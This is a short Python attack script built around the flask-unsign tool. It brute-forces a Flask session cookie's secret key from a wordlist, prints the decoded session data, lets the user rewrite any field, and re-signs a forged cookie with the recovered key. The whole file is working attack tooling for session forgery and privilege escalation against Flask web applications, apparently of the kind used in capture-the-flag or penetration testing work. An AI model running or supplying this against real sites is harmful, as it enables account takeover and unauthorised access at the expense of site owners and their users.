import subprocess
import re
import ast



def unsign(key, words):
    args = ['flask-unsign', '--unsign', '-c', key, '--wordlist', words, '--no-literal-eval']
    result = subprocess.run(args, capture_output=True, text=True)
    data = re.search(r'\{.*\}', str(result))
    return [result.stdout, data.group(0)]

def sign_new_cookie(data, secret):
    args = ['flask-unsign', '--sign', '-c', data, '--secret', secret]
    result = subprocess.run(args, capture_output=True, text=True)
    return result.stdout

session_key = input("SESSION_KEY TO BRUTEFORCE?: ")
wordlist = input("Keylist auswählen: ")
secret, data = unsign(session_key, wordlist)
print("SECRET_KEY = ", secret)
print("DATA FOUND = ", data)
data = ast.literal_eval(data)
for key, value in data.items():
    user_input = input(f"Change the value of {key}? ({value}) ")
    data[key] = value if user_input == "" else user_input 
print("NEW DATA = ", data)
data = str(data)
cookie = sign_new_cookie(data, secret)
print("Cookie:", cookie)